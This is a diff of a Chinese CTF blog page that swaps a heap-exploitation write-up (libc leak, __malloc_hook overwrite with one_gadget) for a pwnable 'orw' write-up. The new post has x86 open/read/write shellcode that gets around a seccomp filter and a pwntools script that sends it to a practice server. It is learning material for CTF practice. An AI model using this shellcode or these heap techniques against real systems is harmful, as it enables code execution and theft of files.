@@ -16,24 +16,24 @@
   <meta name="author" content="Hush">
   <meta name="keywords" content="">
   
-    <meta name="description" content="白天睡觉，晚上来写道题。 分析这道题涉及了unsortedbins，malloc_hook，堆溢出。 heap的菜单选项常规题，做到目前为止，主要是两个思路： 先check，根据RELRO。如果为full，那么就需要malloc_hook。如果为partial，就直接更改got表就可以了。 在create函数中可以明显看出来这是个结构体  一个结构体有24个字节，前8个为标志位，中间8个size位">
+    <meta name="description" content="需要自己写入一段shellcode。 但这道题的特殊之处就在于，这道题调用**orw_seccomp**函数后，会禁止一些系统调用，只会保留一些安全的系统调用。   seccomp相当于内核中的一种安全机制，正常情况下，程序可以使用所有的 syscall，但是当劫持程序流程之后通过 exeve 来呼叫 syscall 得到 shell 时 seccomp 边排上了用场，他可以过滤掉某些 sysc">
 <meta property="og:type" content="article">
-<meta property="og:title" content="roarctf_2019_easy_pwn">
-<meta property="og:url" content="https://hushs1gnal.github.io/2021/07/29/roarctf_2019_easy_pwn/index.html">
+<meta property="og:title" content="Pwnable_orw(需要写入shellcode)">
+<meta property="og:url" content="https://hushs1gnal.github.io/2021/10/01/pwnable_orw/index.html">
 <meta property="og:site_name" content="Hush&#39;blog">
-<meta property="og:description" content="白天睡觉，晚上来写道题。 分析这道题涉及了unsortedbins，malloc_hook，堆溢出。 heap的菜单选项常规题，做到目前为止，主要是两个思路： 先check，根据RELRO。如果为full，那么就需要malloc_hook。如果为partial，就直接更改got表就可以了。 在create函数中可以明显看出来这是个结构体  一个结构体有24个字节，前8个为标志位，中间8个size位">
+<meta property="og:description" content="需要自己写入一段shellcode。 但这道题的特殊之处就在于，这道题调用**orw_seccomp**函数后，会禁止一些系统调用，只会保留一些安全的系统调用。   seccomp相当于内核中的一种安全机制，正常情况下，程序可以使用所有的 syscall，但是当劫持程序流程之后通过 exeve 来呼叫 syscall 得到 shell 时 seccomp 边排上了用场，他可以过滤掉某些 sysc">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://hushs1gnal.github.io/img/hello1.jpg">
-<meta property="article:published_time" content="2021-07-28T20:57:39.000Z">
-<meta property="article:modified_time" content="2022-05-24T05:48:18.356Z">
+<meta property="og:image" content="https://hushs1gnal.github.io/img/hello4.jpg">
+<meta property="article:published_time" content="2021-10-01T12:21:38.000Z">
+<meta property="article:modified_time" content="2022-05-24T06:15:24.579Z">
 <meta property="article:author" content="Hush">
 <meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://hushs1gnal.github.io/img/hello1.jpg">
+<meta name="twitter:image" content="https://hushs1gnal.github.io/img/hello4.jpg">
   
   
   
-  <title>roarctf_2019_easy_pwn - Hush&#39;blog</title>
+  <title>Pwnable_orw(需要写入shellcode) - Hush&#39;blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -184,7 +184,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="roarctf_2019_easy_pwn"></span>
+            <span id="subtitle" data-typed-text="Pwnable_orw(需要写入shellcode)"></span>
           
         </div>
 
@@ -195,8 +195,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2021-07-29 04:57" pubdate>
-          2021年7月29日 凌晨
+        <time datetime="2021-10-01 20:21" pubdate>
+          2021年10月1日 晚上
         </time>
       </span>
     
@@ -207,7 +207,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          903 字
+          1.2k 字
         
       </span>
     
@@ -247,32 +247,27 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">roarctf_2019_easy_pwn</h1>
+            <h1 style="display: none">Pwnable_orw(需要写入shellcode)</h1>
             
             <div class="markdown-body">
               
-              <p>白天睡觉，晚上来写道题。</p>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这道题涉及了unsortedbins，malloc_hook，堆溢出。</p>
-<p>heap的菜单选项常规题，做到目前为止，主要是两个思路：</p>
-<p>先check，根据RELRO。如果为full，那么就需要malloc_hook。如果为partial，就直接更改got表就可以了。</p>
-<p>在create函数中可以明显看出来这是个结构体</p>
-<p><img src="/img/roarctf_2019_easy_pwn-1.png" srcset="/img/loading.gif" lazyload alt="roarctf_2019_easy_pwn-1"></p>
-<p>一个结构体有24个字节，前8个为标志位，中间8个size位，后8个是alloc出来的chunk的指针。</p>
-<p>（alloc和malloc不同的是 alloc的free后会清空用户数据区）</p>
-<p>其中a1 为基地址，我一开始还打算去找这个a1，</p>
-<p>但是看到这个a1的初始化。</p>
-<p><img src="/img/roarctf_2019_easy_pwn-2.png" srcset="/img/loading.gif" lazyload alt="roarctf_2019_easy_pwn-2"></p>
-<p>这里面buf是随机数字，所以a1搜寻未果。</p>
-<p><img src="/img/roarctf_2019_easy_pwn-3.png" srcset="/img/loading.gif" lazyload alt="roarctf_2019_easy_pwn-3"></p>
-<p>fill函数中，没有根据chunk的大小来限制写入大小。所以存在着溢出漏洞。</p>
-<p>主要思路就是，根据unsorted bin 中的fd。利用main_arean泄露libc（这个还没有查阅资料）</p>
-<p>然后利用之前布置好的盖在小块的大块来dump出来。</p>
-<p>接下来是漏洞利用。钩子函数详细，可以查阅这个资料<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/99315504">https://blog.csdn.net/qq_41453285/article/details/99315504</a></p>
-<p>里面介绍的很清晰，具体思路就是，在钩子函数之前有一个为末位的一块内存区域，因为fastbin中没有对齐限制。所以我们可以修改fastbin中最后一个的fd指针，指向这里，让fastbin将它加入，然后在malloc一下，之后就可以通过溢出（具体溢出长度，上面那个资料中有详细的介绍）来修改malloc_hook 处的内容：malloc函数执行的时候会先检测__malloc_hook是否为空，如果不为空就执行__mallochook。所以这时候把malloc_hook 修改为一个one_gadget的地址（好像是存在这几个固定的地址。只需要libc的基地址加上这个偏移）</p>
-<p>那么最后再malloc一个chunk就可以触发 one_gadget。</p>
-<p>果然还是多做题才能多涨姿势。</p>
-<p>但是套路应该就是这几个套路了。</p>
-<p>难题可能在泄露libc上下难度，目前我觉得应该就是这几个套路了，后续继续学习新的漏洞利用手段。</p>
+              <p><img src="/img/orw.png" srcset="/img/loading.gif" lazyload alt="orw-1"></p>
+<p>需要自己写入一段shellcode。</p>
+<p>但这道题的特殊之处就在于，这道题调用<code>**orw_seccomp**</code>函数后，会禁止一些系统调用，只会保留一些安全的系统调用。</p>
+<p><img src="/img/orw-2.png" srcset="/img/loading.gif" lazyload alt="orw-2"></p>
+<p> <strong>seccomp</strong>相当于内核中的一种安全机制，正常情况下，程序可以使用所有的 syscall，但是当劫持程序流程之后通过 exeve 来呼叫 syscall 得到 shell 时 seccomp 边排上了用场，他可以过滤掉某些 syscall，只允许使用部分 syscall。</p>
+<p>这道题为我们保留了 open，read，write函数的调用，即我们可以打开flag文件，然后读出flag</p>
+<p> 然而写一段汇编代码并不像直接写c语言那么简单</p>
+<h4 id="1，sys-open-const-char-user-filename-int-flags-int-mode"><a href="#1，sys-open-const-char-user-filename-int-flags-int-mode" class="headerlink" title="1，sys_open(const char __user *filename, int flags, int mode)"></a>1，sys_open(const char __user *filename, int flags, int mode)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push 0x0            #/x00<br>push 0x67616c66     #&#x27;flags&#x27;小端序<br>mov ebx,esp        <br>xor ecx,ecx         #0<br>xor edx,edx         #0<br>mov eax,0x5         #调用号<br>int 0x80            #sys_open(flags,0,0)<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-sys-read-unsigned-int-fd-char-user-buf-size-t-count"><a href="#2-sys-read-unsigned-int-fd-char-user-buf-size-t-count" class="headerlink" title="2.sys_read(unsigned int fd, char __user * buf, size_t count)"></a>2.sys_read(unsigned int fd, char __user * buf, size_t count)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0x3;<br>mov ecx,ebx;    # ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”<br>mov ebx,0x3;    # 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件<br>mov edx,0x102;  #对应字节数<br>int 0x80;<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-sys-write-unsigned-int-fd-const-char-user-buf-size-t-count"><a href="#3-sys-write-unsigned-int-fd-const-char-user-buf-size-t-count" class="headerlink" title="3.sys_write(unsigned int, fd, const char __user *, buf, size_t, count))"></a>3.sys_write(unsigned int, fd, const char __user *, buf, size_t, count))</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0x4;    # eax = sys_write<br>mov ebx,0x1;    # ebx = unsigned int fd = 1<br>int 0x80;<br></code></pre></td></tr></table></figure>
+
+<p> 当然，wp中还有一个更简单的办法，让pwntools代你写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29213</span>)<br> <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;orw&#x27;</span>)<br> <br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<br>shellcode = asm(shellcode)<br> <br>r.sendline(shellcode)<br> <br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>这道题算是让我长见识了，挺有趣的一道题，学到了不少。但以我个人目前的实力来看，单独做出来应该是比较困难的，还需要继续学习，看一看题。</p>
 
               
             </div>
@@ -295,7 +290,7 @@
   
     <span>></span>
     
-  <a href="/categories/Pwn/heap/" class="category-chain-item">heap</a>
+  <a href="/categories/Pwn/base/" class="category-chain-item">base</a>
   
   
 
@@ -324,8 +319,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>roarctf_2019_easy_pwn</div>
-      <div>https://hushs1gnal.github.io/2021/07/29/roarctf_2019_easy_pwn/</div>
+      <div>Pwnable_orw(需要写入shellcode)</div>
+      <div>https://hushs1gnal.github.io/2021/10/01/pwnable_orw/</div>
     </div>
     <div class="license-meta">
       
@@ -337,7 +332,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2021年7月29日</div>
+          <div>2021年10月1日</div>
         </div>
       
       
@@ -367,9 +362,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/09/18/ucore_lab1/" title="ucore_lab1">
+                      <a href="/2021/10/15/how2heap_2.27/" title="how2heap部分(libc2.27)">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ucore_lab1</span>
+                        <span class="hidden-mobile">how2heap部分(libc2.27)</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -377,8 +372,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/07/27/ZJCTF2019-EasyHeap/" title="ZJCTF2019-EasyHeap">
-                        <span class="hidden-mobile">ZJCTF2019-EasyHeap</span>
+                      <a href="/2021/09/18/ucore_lab1/" title="ucore_lab1">
+                        <span class="hidden-mobile">ucore_lab1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
